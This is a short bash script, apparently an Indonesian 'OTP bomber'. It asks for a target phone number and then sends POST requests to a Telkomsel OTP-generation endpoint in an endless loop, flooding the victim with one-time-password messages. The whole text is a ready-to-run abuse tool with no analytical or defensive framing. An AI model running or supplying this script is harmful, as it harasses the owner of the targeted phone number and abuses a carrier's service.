#!/bin/bash
read -p 'Nomer Target[Example 0896xxxxx]: ' nmr
while :;do curl -X POST -d "msisdn=$nmr" https://www.telkomsel.com/daftar-ulang-prepaid?ch=WEB/generateOTP;done
